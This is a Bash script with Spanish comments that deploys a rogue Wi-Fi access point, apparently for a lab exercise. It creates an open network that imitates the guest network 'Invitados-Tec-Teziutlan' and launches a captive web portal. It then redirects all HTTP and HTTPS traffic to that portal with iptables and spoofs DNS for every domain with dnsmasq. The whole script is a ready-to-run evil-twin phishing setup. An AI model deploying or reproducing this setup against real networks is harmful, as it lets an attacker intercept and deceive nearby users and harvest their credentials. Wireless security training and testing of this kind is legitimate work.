#!/bin/bash
# Script de Despliegue de Rogue AP - Adaptado para TUF A16 (V3 - Anti-Segfault)

INTERFACE="wlp3s0" 
AP_IP="10.0.0.1"
PORTAL_PORT="8000"

echo " [1/6] Deteniendo servicios y liberando hardware..."
sudo systemctl stop NetworkManager 2>/dev/null
# La clave 1: Detener el servicio base, no solo el proceso
sudo systemctl stop wpa_supplicant 2>/dev/null
sudo pkill wpa_supplicant 2>/dev/null
sudo pkill hostapd 2>/dev/null
pkill -f uvicorn 2>/dev/null

# La clave 2: Asegurar que no hay bloqueos de energía
sudo rfkill unblock all
sleep 2 # Damos tiempo al hardware de respirar

echo " [2/6] Reiniciando la tarjeta $INTERFACE..."
sudo ip link set $INTERFACE down
sleep 1
sudo ip addr flush dev $INTERFACE
sudo ip addr add $AP_IP/24 dev $INTERFACE
sudo ip link set $INTERFACE up
sleep 2 # Damos tiempo a la tarjeta de encenderse de nuevo

echo " [3/6] Levantando Portal Cautivo en segundo plano..."
cd /home/reusrs/Laboratorio/WebPortal
source venv/bin/activate
python -m uvicorn portal:app --host 0.0.0.0 --port $PORTAL_PORT &
sleep 2

echo " [4/6] Configurando Hostapd (Red: Invitados-Tec-Teziutlan)..."
cat <<EOF | sudo tee /tmp/hostapd.conf > /dev/null
interface=$INTERFACE
driver=nl80211
ssid=Invitados-Tec-Teziutlan
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
wmm_enabled=1
max_num_sta=15
EOF

# Ejecutar hostapd. Si todo salió bien, ya no habrá violación de segmento
sudo hostapd /tmp/hostapd.conf -B
sleep 2

echo " [5/6] Configurando Iptables (Redirección Fantasma)..."
sudo iptables -t nat -F
sudo iptables -F
sudo iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j DNAT --to-destination $AP_IP:$PORTAL_PORT
sudo iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 443 -j DNAT --to-destination $AP_IP:$PORTAL_PORT
sudo iptables -A FORWARD -i $INTERFACE -j ACCEPT

echo " [6/6] Iniciando Dnsmasq (Asignación de IPs y DNS Spoofing)..."
sudo pkill dnsmasq 2>/dev/null
cat <<EOF | sudo tee /tmp/dnsmasq.conf > /dev/null
interface=$INTERFACE
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
address=/#/$AP_IP
EOF
sudo dnsmasq -C /tmp/dnsmasq.conf --no-daemon
